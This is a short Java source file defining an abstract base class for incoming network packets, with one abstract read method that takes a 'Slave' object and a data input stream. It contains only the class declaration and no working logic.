package com.redpois0n.packets.incoming;

import java.io.DataInputStream;

import com.redpois0n.Slave;


public abstract class AbstractIncomingPacket {

	public abstract void read(Slave slave, DataInputStream dis) throws Exception;
	
	//public abstract byte getPacketId();

}
